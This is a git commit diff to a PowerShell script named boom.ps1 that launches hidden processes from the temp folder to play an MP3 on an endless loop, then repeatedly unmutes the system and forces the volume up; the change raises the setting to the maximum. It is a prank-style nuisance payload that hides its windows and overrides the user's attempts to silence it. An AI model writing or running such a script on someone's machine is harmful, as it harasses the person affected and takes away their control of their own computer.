9d81c14743c99f07323c86550d4afb363dfc642e
l4l4l4l4ll <68412637+l4l4l4l4ll@users.noreply.github.com>
2023-05-18 17:43:33 +1000

    Add files via upload

--- loud/boom.ps1
+++ loud/boom.ps1
@@ -4,6 +4,6 @@ Start-Process -FilePath "$env:temp/boom/boom.bat" -WindowStyle Hidden
 Start-Process -FilePath "$env:temp/boom/mpg123.exe" -WindowStyle Hidden -ArgumentList "--loop -1 $env:temp/boom/boom.mp3"
 while ($true) {
   Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "mutesysvolume 0"
-  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "setsysvolume 1311"
+  Start-Process -FilePath "$env:temp/boom/nircmd.exe" -WindowStyle Hidden -ArgumentList "setsysvolume 65535"
   Start-Sleep -Seconds 1
 }
